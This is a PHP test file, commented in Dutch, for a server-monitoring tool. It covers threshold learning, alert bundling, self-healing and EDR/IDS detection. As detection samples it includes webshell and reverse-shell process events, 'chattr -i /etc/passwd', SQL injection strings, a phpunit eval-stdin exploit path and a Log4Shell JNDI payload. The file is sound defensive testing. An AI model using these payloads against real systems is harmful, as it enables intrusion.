<?php
/**
 * PHP-tests (GitHub Actions, met een lege MariaDB): de rekenkant van slimme drempels, bundelen, zelf herstellen,
 * de statuspagina en Analyse, en dat een update geen instellingen verandert.
 * Gebruik: php tests/php/run.php   (op een testdatabase: de tests voegen checks en meetwaarden toe)
 */
declare(strict_types=1);

if (PHP_SAPI !== 'cli') {
    exit("Alleen via CLI\n");
}
require __DIR__ . '/../../src/bootstrap.php';
I18n::set('nl');

$fails = 0;
$n = 0;
function ok(bool $cond, string $what): void
{
    global $fails, $n;
    $n++;
    if ($cond) {
        echo "  ✔ $what\n";
    } else {
        $fails++;
        echo "  ✘ $what\n";
    }
}
function section(string $s): void
{
    echo "\n$s\n";
}

function array_sort_copy(array $a): array
{
    sort($a);
    return $a;
}

section('Database en update');
Installer::runSchema();
save_setting('thresh_default', 'manual');
Installer::runSchema();
ok(setting('thresh_default') === 'manual' || q("SELECT value FROM settings WHERE name = 'thresh_default'")->fetchColumn() === 'manual', 'een update laat een gewijzigde instelling staan');
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-a', '10.0.0.1', 'agent'), ('ci-b', '10.0.0.2', 'agent'), ('ci-gw', '10.0.0.254', 'remote')");
$ha = (int) q("SELECT id FROM hosts WHERE name = 'ci-a'")->fetchColumn();
$hb = (int) q("SELECT id FROM hosts WHERE name = 'ci-b'")->fetchColumn();
$gw = (int) q("SELECT id FROM hosts WHERE name = 'ci-gw'")->fetchColumn();
q('INSERT INTO checks (host_id, type, name, warn_threshold, crit_threshold) VALUES (?, ?, ?, 85, 95)', [$ha, 'cpu', 'CPU']);
$cpu = (int) db()->lastInsertId();
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() === 'auto', 'een nieuwe check begint op "auto"');

section('Slimme drempels');
mt_srand(7);
$rows = [];
for ($t = time() - 28 * 86400; $t < time(); $t += 600) {
    $h = (int) date('G', $t);
    $v = 20 + 15 * sin(($h - 6) / 24 * M_PI) + mt_rand(0, 80) / 10;
    if ($h === 3) {
        $v = 92 + mt_rand(0, 70) / 10;   // back-up 's nachts
    }
    if (time() - $t < 7 * 86400) {
        $v += 12;                        // sluipende stijging
    }
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $cpu, $v, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
q("UPDATE checks SET thresh_mode = 'manual' WHERE id = ?", [$cpu]);
$m = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch());
$mon3 = 3;          // maandag 3:00
$mon14 = 14;        // maandag 14:00
ok($m !== null && $m['days'] >= 7, 'leert uit 28 dagen meetwaarden');
ok($m['w'][$mon3] > 100, 'de back-up om 3:00 is normaal: warning boven 100% (' . round($m['w'][$mon3]) . ')');
ok($m['w'][$mon14] >= 50 && $m['w'][$mon14] < 85, 'overdag een warning tussen 50 en 85% (' . round($m['w'][$mon14]) . ')');
ok(($m['sim']['fixed'] ?? 0) > ($m['sim']['smart'] ?? 99), 'slim geeft minder dagen met een warning dan vast (' . $m['sim']['fixed'] . ' → ' . $m['sim']['smart'] . ')');
ok($m['drift'] !== null, 'de sluipende stijging wordt gezien');
// 1.156.0: zelf omzetten naar slim met vangnet (minstens 2 dagen minder warnings), één keer, terug te zetten
ok(($m['sim']['fixed'] - $m['sim']['smart']) >= 2 && q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() === 'guard', 'handmatig → zelf omgezet naar slim met vangnet');
ok((string) q('SELECT auto_at FROM check_smart WHERE check_id = ?', [$cpu])->fetchColumn() !== '', 'het omzetten is onthouden (auto_at)');
$cl = q("SELECT * FROM change_log WHERE kind = 'check' AND ref_id = ? ORDER BY id DESC LIMIT 1", [$cpu])->fetch();
ok($cl && str_contains($cl['label'], 'slim met vangnet'), 'regel in het wijzigingslogboek');
ok((int) q("SELECT COUNT(*) FROM alerts WHERE kind = 'info' AND message LIKE '%naar slim met vangnet%'")->fetchColumn() >= 1, 'ℹ️-melding op de meldingenpagina');
ChangeLog::undo((int) $cl['id']);
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() === 'manual', 'terugzetten: weer handmatig');
Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch());
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() === 'manual', 'na terugzetten niet opnieuw omgezet');
ok(Smart::eligible(['type' => 'container', 'metric' => 'cpu']) && !Smart::eligible(['type' => 'container', 'metric' => '']), 'containers: losse CPU-check wel, gecombineerde niet');
ok(Smart::eligible(['type' => 'dns']) && Smart::eligible(['type' => 'ntp']) && Smart::eligible(['type' => 'mysql']), 'DNS, NTP en MySQL leren mee');
save_setting('smart_auto', '0');
$row = q('SELECT c.*, h.mode FROM checks c JOIN hosts h ON h.id = c.host_id WHERE c.id = ?', [$cpu])->fetch();
$row['thresh_mode'] = 'guard';
$row['guard_threshold'] = 90;
$eff = Smart::apply($row);
ok((float) $eff['crit_threshold'] <= 90, 'het vangnet geldt altijd (critical ≤ 90)');
ok(!Smart::eligible(['type' => 'disk']), 'disks leren niet');
ok(Smart::eligible(['type' => 'snmp', 'metric' => 'temp']) && !Smart::eligible(['type' => 'snmp', 'metric' => 'uptime']), 'SNMP: temperatuur wel, uptime niet');
ok(!Smart::eligible(['type' => 'ping', 'reverse_ok' => 1]), 'omgekeerde checks leren niet');
q("UPDATE checks SET thresh_mode = 'auto' WHERE id = ?", [$cpu]);
save_setting('thresh_default', 'guard');
$r2 = Smart::apply(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch() + ['hid' => $ha]);
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() !== 'auto', '"auto" wordt bij de eerste run de standaard');

// 1.108.1: grillige check (camera-webinterface): elke dag één losse piek. Telt zoals een melding (melden na N).
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold, thresh_mode) VALUES (?, 'http', 'http://cam', 'Camera', 500, 2000, 'manual')", [$ha]);
$cam = (int) db()->lastInsertId();
$rows = [];
$t0 = strtotime('today') - 14 * 86400;
for ($t = $t0; $t < time(); $t += 300) {
    // Elke dag één piek, elke dag 7 uur later (dagnummer vanaf het begin, niet de datum: met de datum kwamen rond de maandwissel
    // twee pieken precies een week na elkaar op hetzelfde uur, dan leert de slimme drempel ze als normaal en faalde deze test)
    $spike = (int) date('G', $t) === (intdiv($t - $t0, 86400) * 7) % 24 && (int) date('i', $t) < 5;
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $cam, $spike ? 3000 : 90 + mt_rand(0, 300) / 10, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
$m1 = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cam])->fetch());
ok($m1['sim']['need'] === 1 && $m1['sim']['fixed'] >= 13 && $m1['sim']['spiky'], 'melden na 1: elke dag een warning, en grillig (' . $m1['sim']['fixed'] . '/' . $m1['sim']['smart'] . ')');
q('UPDATE checks SET notify_fails = 3 WHERE id = ?', [$cam]);
$m3 = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cam])->fetch());
ok($m3['sim']['need'] === 3 && $m3['sim']['fixed'] === 0 && $m3['sim']['smart'] === 0, 'melden na 3: losse pieken tellen niet als dag met warning');
$prop = array_values(array_filter(Smart::proposals(), static fn($p) => $p['id'] === $cam))[0] ?? null;
ok($prop && $prop['gain'] === 0 && $prop['spiky'] && $prop['need'] === 3, 'voorstel: geen winst, grillig');

section('Bundelen');
q('UPDATE hosts SET parent_id = ? WHERE id IN (?, ?)', [$gw, $ha, $hb]);
$items = [];
foreach ([$ha, $hb] as $h) {
    $items[] = ['item' => ['status' => STATUS_CRIT], 'check' => ['hid' => $h]];
}
$cause = Bundle::cause($items);
ok($cause !== null && str_contains($cause, 'ci-gw'), 'gemeenschappelijke oorzaak: dezelfde server erboven');
ok(str_contains(Bundle::title($items, $cause), '2'), 'titel noemt het aantal servers');
q('UPDATE hosts SET parent_id = NULL WHERE id IN (?, ?)', [$ha, $hb]);
ok(Bundle::cause([$items[0]]) === null, 'één server is geen bundel');

section('Zelf herstellen en waakhond');
ok(Heal::clean(['type' => 'service'], 'restart') === 'restart', 'herstarten mag bij een service');
ok(Heal::clean(['type' => 'ping'], 'restart') === null, 'herstarten mag niet bij een ping-check');
ok(Heal::clean(['type' => 'ping'], 'cmd:fix-db') === 'cmd:fix-db', 'een herstelcommando op naam');
ok(Heal::clean(['type' => 'ping'], 'cmd:../../bin/sh') === null, 'geen paden in de naam van een herstelcommando');
save_setting('pushover_enabled', '1');
save_setting('pushover_user', 'ci-user');
save_setting('pushover_token', 'ci-token');
q('UPDATE hosts SET watchdog = 1, watchdog_min = 3 WHERE id = ?', [$ha]);
$plain = implode("\n", Heal::testLines($ha, false));
$secure = implode("\n", Heal::testLines($ha, true));
ok(str_contains($secure, 'ci-token') && !str_contains($plain, 'ci-token'), 'Pushover-gegevens alleen in een versleutelde lijst');

section('Statuspagina');
StatusPage::save(['on' => true, 'title' => 'Thuis', 'items' => [['label' => 'CPU', 'checks' => [$cpu]], ['label' => '', 'checks' => [1]]]]);
ok(count(StatusPage::items()) === 1, 'onderdelen zonder naam vallen weg');
ok(StatusPage::on() && preg_match('/^[a-f0-9]{32}$/', StatusPage::token()) === 1, 'aan, met een geheime sleutel');
$d = StatusPage::data();
ok($d['title'] === 'Thuis' && count($d['components'][0]['days']) === StatusPage::DAYS, 'pagina met 90 dagen per onderdeel');

section('Analyse');
Analytics::cron();
$rep = Analytics::report('7d');
ok(isset($rep['kpi'], $rep['todo'], $rep['reliability']), 'rapport over 7 dagen');

section('Slimme voorstellen (1.108.0)');
// Een check die 6× kort misging (binnen 2 minuten weer goed), elke nacht om 2:05
q('INSERT INTO checks (host_id, type, target, name, interval_sec, thresh_mode) VALUES (?, ?, ?, ?, 60, ?)', [$hb, 'tcp', '22', 'SSH', 'manual']);
$ssh = (int) db()->lastInsertId();
for ($d = 6; $d >= 1; $d--) {
    $t = strtotime(date('Y-m-d', strtotime("-$d days")) . ' 02:05:00');
    q('INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, ?, ?), (?, 2, 0, ?, ?)',
        [$ssh, 'down', date('Y-m-d H:i:s', $t), $ssh, 'up', date('Y-m-d H:i:s', $t + 100)]);
}
// Samen uitvallen: ci-b valt 4× tegelijk uit met ci-gw (een router)
q("UPDATE hosts SET kind = 'router' WHERE id = ?", [$gw]);
q('INSERT INTO checks (host_id, type, name) VALUES (?, ?, ?)', [$gw, 'ping', 'Ping']);
$gwPing = (int) db()->lastInsertId();
q('INSERT INTO checks (host_id, type, name) VALUES (?, ?, ?)', [$hb, 'ping', 'Ping']);
$bPing = (int) db()->lastInsertId();
for ($i = 1; $i <= 4; $i++) {
    $t = date('Y-m-d H:i:s', strtotime("-$i days 14:00"));
    q('INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, ?, ?), (?, 0, 2, ?, ?)', [$gwPing, 'x', $t, $bPing, 'x', $t]);
}
save_setting('alert_auto', '0');
$nAdv = Advice::cron(true);
$adv = Advice::list();
$kinds = array_count_values(array_column($adv, 'kind'));
ok(($kinds['fails'] ?? 0) >= 1, 'voorstel: melden na meer mislukte checks');
ok(($kinds['maint'] ?? 0) >= 1, 'voorstel: vast onderhoudsvenster rond 2:00');
ok(($kinds['dep'] ?? 0) >= 1 && in_array('ci-gw', array_column($adv, 'parent'), true), 'voorstel: ci-b hangt af van ci-gw');
foreach ($adv as $a) {
    Advice::decide($a['id'], true);
}
ok((int) q('SELECT notify_fails FROM checks WHERE id = ?', [$ssh])->fetchColumn() >= 2, 'toegepast: melden na N staat hoger');
ok((int) q('SELECT parent_id FROM hosts WHERE id = ?', [$hb])->fetchColumn() === $gw, 'toegepast: afhankelijkheid ingesteld');
$w = q('SELECT * FROM maint_windows LIMIT 1')->fetch();
ok($w && $w['start'] === '01:55', 'toegepast: venster vanaf 01:55, net voor de storingen van 2:05 (' . ($w['start'] ?? '-') . ', ' . ($w['minutes'] ?? '-') . ' min)');
$in = strtotime(date('Y-m-d') . ' 02:10:00');
ok(Advice::windowFor($ssh, $hb, $in) !== null && Advice::windowFor($ssh, $hb, $in + 3 * 3600) === null, 'venster geldt om 2:10, niet om 5:10');
Advice::cron(true);
ok(Advice::openCount() === 0, 'toegepaste voorstellen komen niet terug');
// 1.156.0: melden na N zelf instellen
q("UPDATE advice SET state = 'open' WHERE kind = 'fails'");
q('UPDATE checks SET notify_fails = 1 WHERE id = ?', [$ssh]);
save_setting('alert_auto', '1');
Advice::cron(true);
ok((int) q('SELECT notify_fails FROM checks WHERE id = ?', [$ssh])->fetchColumn() >= 2 && Advice::openCount() === 0, 'melden na N zelf toegepast');
$cl = q("SELECT * FROM change_log WHERE kind = 'check' AND ref_id = ? ORDER BY id DESC LIMIT 1", [$ssh])->fetch();
ok($cl && str_contains($cl['label'], 'melden na'), 'regel in het wijzigingslogboek');
ChangeLog::undo((int) $cl['id']);
ok((int) q('SELECT notify_fails FROM checks WHERE id = ?', [$ssh])->fetchColumn() === 1, 'terugzetten: weer de vorige waarde');
save_setting('alert_auto', '0');
q("DELETE FROM change_log WHERE kind = 'check' AND ref_id = ?", [$ssh]);   // niet meetellen bij "oorzaak erbij" hieronder
q("DELETE FROM alerts WHERE kind = 'info' AND message LIKE '%melden na%'");

section('Escaleren, oorzaak, afwijkingen, disk, heartbeat, interval');
$esc = new ReflectionMethod('Monitor', 'escalation');
save_setting('esc_on', '0');
ok($esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 3600) === null, 'escaleren uit: niets');
save_setting('esc_on', '1');
save_setting('esc_crit_min', '15');
save_setting('esc_quiet', '0');
ok($esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 600) === null && $esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 1000) === 2, 'critical na 15 min → nood (prioriteit 2)');
q("INSERT INTO alerts (check_id, host_id, status, title, message, kind, created_at) VALUES (NULL, ?, 0, 'ℹ️ INFO: ci-b', 'Agent bijgewerkt van 1.61.1 naar 1.62.0', 'info', NOW() - INTERVAL 3 MINUTE)", [$hb]);
$why = Context::recent(['hid' => $hb]);
ok(str_contains($why, 'Agent bijgewerkt') && str_contains($why, '3 min'), 'oorzaak erbij: ' . $why);
// Afwijking: een SNMP-interfacecheck zonder drempels, normaal ~10, dan 3× 500
q("INSERT INTO checks (host_id, type, metric, target, name, thresh_mode) VALUES (?, 'snmp', 'if', '1', 'eth0', 'manual')", [$ha]);
$if = (int) db()->lastInsertId();
$rows = [];
for ($t = time() - 10 * 86400; $t < time(); $t += 900) {
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $if, 10 + mt_rand(0, 30) / 10, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
$ifRow = q('SELECT c.*, h.name AS host_name, h.id AS hid FROM checks c JOIN hosts h ON h.id = c.host_id WHERE c.id = ?', [$if])->fetch();
ok(Smart::anomEligible($ifRow) && Smart::learnAnom($ifRow) !== null, 'leert wat normaal is bij een check zonder drempels');
$before = (int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% eth0'")->fetchColumn();
for ($i = 0; $i < 3; $i++) {
    $ifRow['anom_streak'] = $i;
    Smart::anomaly($ifRow, ['value' => 500.0, 'status' => 0]);
}
ok((int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% eth0'")->fetchColumn() === $before + 1, 'afwijking na 3 metingen: één ℹ️');
// Disk groeit hard
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold, thresh_mode) VALUES (?, 'disk', '/var', 'Disk /var', 80, 90, 'manual')", [$ha]);
$disk = (int) db()->lastInsertId();
q('INSERT INTO results (check_id, status, value, created_at) VALUES (?, 0, 50, NOW() - INTERVAL 60 MINUTE)', [$disk]);
$dj = new ReflectionMethod('Monitor', 'diskJump');
$dj->invoke(null, ['id' => $disk, 'hid' => $ha, 'host_name' => 'ci-a', 'name' => 'Disk /var'], ['value' => 61.0]);
ok((int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% Disk /var'")->fetchColumn() === 1, 'disk groeit hard: +11 procentpunt in een uur');
// Heartbeat: elke dag rond 2:10, vandaag om 3:00 nog niets
$late = new ReflectionMethod('Heartbeat', 'lateByRhythm');
$oks = [];
for ($d = 6; $d >= 1; $d--) {
    $oks[] = strtotime(date('Y-m-d', strtotime("-$d days")) . ' 02:' . sprintf('%02d', 8 + $d));
}
$msg = $late->invoke(null, ['oks' => $oks], strtotime(date('Y-m-d') . ' 03:00:00'));
ok($msg !== null && str_contains($msg, '02:1'), 'heartbeat te laat volgens zijn ritme: ' . $msg);
ok($late->invoke(null, ['oks' => $oks], strtotime(date('Y-m-d') . ' 02:15:00')) === null, 'heartbeat om 2:15 nog op tijd');
$odd = new ReflectionMethod('Heartbeat', 'oddValue');
ok($odd->invoke(null, ['vals' => [40, 41, 39, 42, 40, 12]], 'GB') !== null, 'back-up veel kleiner dan normaal');
// Slim interval: de query klopt (geen fout) en een check met een probleem is sneller aan de beurt
save_setting('smart_interval', '1');
$sql = new ReflectionMethod('Monitor', 'intervalSql');
$iv = $sql->invoke(null);
q("UPDATE checks SET status = 2, fail_count = 1, interval_sec = 300, last_checked = NOW() - INTERVAL 30 SECOND WHERE id = ?", [$bPing]);
ok((int) q("SELECT COUNT(*) FROM checks c WHERE c.id = ? AND c.last_checked <= NOW() - INTERVAL ($iv - LEAST(15, $iv DIV 4)) SECOND", [$bPing])->fetchColumn() === 1,
    'slim interval: probleem → na 20 s al weer aan de beurt (interval 5 min)');
// 1.108.2: melden na 3 telt met slim interval ook in tijd (3 gewone checks = 2 minuten), niet 3× 20 s
$p3 = ['type' => 'ping', 'notify_fails' => 3, 'interval_sec' => 60];
ok(!Monitor::failsReached($p3, 3, 40) && Monitor::failsReached($p3, 7, 110), 'slim interval: melden na 3 = na ~2 minuten, niet na 40 s');
ok(Monitor::failsReached(['type' => 'cpu', 'notify_fails' => 3, 'interval_sec' => 60], 3, 0), 'checks die niet sneller gaan: gewoon N keer');
save_setting('smart_interval', '0');
ok(Monitor::failsReached($p3, 3, 0) && !Monitor::failsReached($p3, 2, 999), 'zonder slim interval: gewoon N keer');


section('Endpoint-bewaking en inspectie (1.110.0)');
save_setting('ids_enabled', '1');
save_setting('ids_mode', 'learn');
Edr::reset();
ok(count(Sigma::rules()) > 100, 'Sigma-regels geladen (' . count(Sigma::rules()) . ')');
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$ws = ['k' => 'x', 't' => time(), 'pid' => 4242, 'st' => 777, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'id'], 'cmd' => 'sh -c id', 'pc' => 'php-fpm8.2'];
$r = Edr::process($host, ['ev' => [$ws], 'info' => ['audit' => 'ok', 'file' => 'missing', 'fam' => 'deb']]);
$inc = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($inc && (int) $inc['severity'] === 2 && str_starts_with((string) $inc['dkey'], 'rz-webshell|'), 'webserver start een shell → critical (eigen regel)');
ok($r === [] && str_contains((string) $inc['detail'], 'Leren'), 'modus Leren: niets gestopt, wel gemeld');
ok(count(Edr::evidenceFor((int) $inc['id'])) === 1, 'bewijs bij het incident');
save_setting('ids_mode', 'block');
$ws['pid'] = 4243;
$r = Edr::process($host, ['ev' => [$ws]]);
ok(($r['edr_kill'] ?? null) === [[4243, 777]] && (int) q('SELECT COUNT(*) FROM ids_kills WHERE host_id = ? AND pid = 4243', [$ha])->fetchColumn() === 1, 'modus Blokkeren: proces wordt meteen gestopt');
$st = Edr::status(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch());
ok($st['missing'] === ['inotify'], 'ontbrekend onderdeel gemeld: inotify-tools');
// Sigma-regel (alleen Sigma kent deze): chattr -i
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 50, 'st' => 1, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/chattr', 'comm' => 'chattr', 'argv' => ['chattr', '-i', '/etc/passwd'], 'cmd' => 'chattr -i /etc/passwd', 'pc' => 'bash']]]);
$sig = q("SELECT i.* FROM ids_incidents i WHERE host_id = ? AND type = 'edr' AND title LIKE 'Sigma:%' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($sig && (int) $sig['severity'] === 1 && str_contains((string) $sig['detail'], 'SigmaHQ'), 'Sigma-regel raak, met bronvermelding: ' . ($sig['title'] ?? '-'));
// Reverse shell via het netwerk: shell met een verbinding naar buiten
Edr::process($host, ['ev' => [['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 61, 'st' => 2, 'exe' => '/usr/bin/bash', 'comm' => 'bash', 'rip' => '203.0.113.9', 'rp' => 9001, 'lp' => 51234]]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-net-shell|%' AND ip = '203.0.113.9'", [$ha])->fetchColumn() === 1, 'shell met een verbinding naar buiten → critical');
// Gewoon proces: geen incident, wel in Live en in edr_seen
$before = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'edr'")->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 70, 'st' => 3, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/ls', 'comm' => 'ls', 'argv' => ['ls', '-la'], 'cmd' => 'ls -la', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'edr'")->fetchColumn() === $before && count(Edr::feed(10, $ha)) >= 4, 'gewoon proces: alleen in Live');
// Per server uit: niets verwerken
q('UPDATE hosts SET edr_on = 0 WHERE id = ?', [$ha]);
$n0 = (int) q('SELECT COUNT(*) FROM edr_events')->fetchColumn();
Edr::process(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch(), ['ev' => [$ws]]);
ok((int) q('SELECT COUNT(*) FROM edr_events')->fetchColumn() === $n0 && Edr::agentLines(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch()) === [], 'per server uit: geen sensoren, niets verwerkt');
q('UPDATE hosts SET edr_on = 1 WHERE id = ?', [$ha]);
// Web: SQL-injectie en een bekende exploit, wachtwoord gemaskeerd, IP geblokkeerd
$a = Inspect::analyze('GET', "/item.php?id=1%27%20UNION%20SELECT%20password%20FROM%20users--", 'Mozilla/5.0');
ok(in_array('sqli', array_column($a['tech'], 0), true), 'SQL-injectie herkend (URL-gecodeerd)');
ok((Inspect::analyze('POST', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'curl')['cve'][0] ?? '') === 'CVE-2017-9841', 'bekende exploit met CVE herkend');
ok(Inspect::analyze('GET', '/index.php?page=home', 'Mozilla/5.0')['tech'] === [], 'gewoon verzoek: niets');
ok(Inspect::redact('/login?user=a&password=geheim&x=1') === '/login?user=a&password=***&x=1', 'wachtwoord in de query gemaskeerd');
Inspect::requests($host, [['198.51.100.7', time(), 'GET', "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.y%2Fa%7D", 404, 0, 'Mozilla/5.0', '-']]);
$wi = q("SELECT * FROM ids_incidents WHERE type = 'web_payload' AND ip = '198.51.100.7'")->fetch();
ok($wi && str_contains((string) $wi['title'], 'Log4Shell') && str_contains((string) $wi['detail'], '⛔'), 'Log4Shell-poging: incident en IP geblokkeerd');
// Zoals de agent het stuurt: tijd uit de log, " als \x22 (nginx)
Inspect::requests($host, [['192.0.2.50', '28/Oct/2026:10:00:02 +0100', 'GET', '/?x=1\\x22 OR \\x221\\x22=\\x221', 200, 10, 'Mozilla/5.0', '-']]);
$ev = q("SELECT e.data FROM ids_evidence e JOIN ids_incidents i ON i.id = e.incident_id WHERE i.ip = '192.0.2.50'")->fetchColumn();
$evd = json_decode((string) $ev, true)['ev'] ?? [];
ok(($evd['uri'] ?? '') === '/?x=1" OR "1"="1' && ($evd['at'] ?? 0) === 1793178002, 'verzoek van de agent: \\x22 teruggezet, tijd uit de log (' . ($evd['uri'] ?? '-') . ')');
// "Dit is normaal" bij een endpoint-incident: niet meer melden en niet meer ingrijpen
q("INSERT INTO ids_baseline (host_id, kind, item) VALUES (?, 'ignore', ?)", [$ha, mb_substr('edr|' . $inc['dkey'], 0, 255)]);
$ws['pid'] = 4244;
ok(Edr::process($host, ['ev' => [$ws]]) === [], '"Dit is normaal": proces niet meer gestopt');

section('Afwijkingen, ketens en MITRE (1.111.0)');
ok(Mitre::tech('T1059.004')['name'] === 'Unix Shell' && Mitre::tacticsOf(['T1105']) === ['command-and-control'] && count(Mitre::tactics()) >= 14, 'MITRE ATT&CK geladen');
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND src = 'rule' AND FIND_IN_SET('T1505.003', techs)", [$ha])->fetchColumn() >= 1, 'regeltreffer wordt een signaal met MITRE-techniek');
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE host_id = ? AND src = 'ids' AND feature = 'web_payload' AND FIND_IN_SET('initial-access', tactics)", [$ha])->fetchColumn() >= 1, 'IDS-incident (webaanval) wordt een signaal: Binnenkomen');
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
ok($host['edr_learn_from'] !== null && Anomaly::learning($host) && (int) q("SELECT COUNT(*) FROM ids_signals WHERE src = 'anom'")->fetchColumn() === 0, 'leerperiode: alles wordt geleerd, niets gemeld');
// Leren afronden; daarna is een nieuw programma onder nginx een afwijking (incident), een nieuw systeemprogramma alleen een signaal
Anomaly::relearn($ha, true);
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$nx = ['k' => 'x', 't' => time(), 'pid' => 900, 'st' => 9, 'uid' => 1001, 'u' => 'app', 'exe' => '/opt/app/worker', 'comm' => 'worker', 'argv' => ['worker'], 'cmd' => 'worker', 'pc' => 'nginx'];
Edr::process($host, ['ev' => [$nx]]);
$an = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'anomaly' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($an && str_contains((string) $an['title'], 'nginx start worker') && (int) $an['severity'] === 1, 'na het leren: nieuw programma onder nginx → afwijking (warning): ' . ($an['title'] ?? '-'));
$n1 = (int) q("SELECT COUNT(*) FROM ids_signals WHERE src = 'anom'")->fetchColumn();
Edr::process($host, ['ev' => [$nx]]);
ok((int) q("SELECT COUNT(*) FROM ids_signals WHERE src = 'anom'")->fetchColumn() === $n1, 'zelfde nog eens: al geleerd, geen nieuwe afwijking');
$ni = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'anomaly'")->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 901, 'st' => 9, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/tree', 'comm' => 'tree', 'argv' => ['tree'], 'cmd' => 'tree', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'anomaly'")->fetchColumn() === $ni && count(Anomaly::list(1, $ha)) === 2, 'kleine afwijking (nieuw systeemprogramma): alleen op de pagina');
// Ketens op een eigen server: webaanval en daarna code van de webserver
q("INSERT INTO hosts (name, address, mode, edr_on, edr_learn_from) VALUES ('ci-c', '10.0.0.3', 'agent', 1, NOW() - INTERVAL 30 DAY), ('ci-d', '10.0.0.4', 'agent', 1, NOW() - INTERVAL 30 DAY)");
$hc = q("SELECT * FROM hosts WHERE name = 'ci-c'")->fetch();
$hd = q("SELECT * FROM hosts WHERE name = 'ci-d'")->fetch();
Chain::reset();
Inspect::requests($hc, [['203.0.113.77', time(), 'GET', '/shop.php?id=1%27%20UNION%20SELECT%201,2--', 200, 10, 'Mozilla/5.0', '-']]);
Edr::process($hc, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 300, 'st' => 4, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/php8.2', 'comm' => 'php8.2', 'argv' => ['php8.2', 'x.php'], 'cmd' => 'php8.2 x.php', 'pc' => 'php-fpm8.2']]]);
Chain::check($hc);
$ch = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'chain'", [$hc['id']])->fetch();
ok($ch && $ch['dkey'] === 'web|203.0.113.77' && (int) $ch['severity'] === 2, 'keten: webaanval gevolgd door code op de webserver → critical');
ok($ch && str_contains((string) $ch['detail'], '203.0.113.77') && (int) q("SELECT COUNT(*) FROM ids_blocks WHERE host_id = ? AND ip = '203.0.113.77' AND removed_at IS NULL", [$hc['id']])->fetchColumn() >= 1, 'keten in de modus Blokkeren: aanvaller geblokkeerd');
$steps = Chain::list(30, (int) $hc['id'])[0]['steps'] ?? [];
ok(count($steps) >= 2 && in_array('initial-access', $steps[0]['tactics'], true), 'stappen van de keten in volgorde, met tactiek (' . count($steps) . ')');
Chain::check($hc);
ok((int) q("SELECT hits FROM ids_incidents WHERE id = ?", [$ch['id']])->fetchColumn() === 1, 'niets nieuws: keten niet opnieuw');
// Binnenhalen en daarna contact naar buiten (dropper): isoleren
Chain::reset();
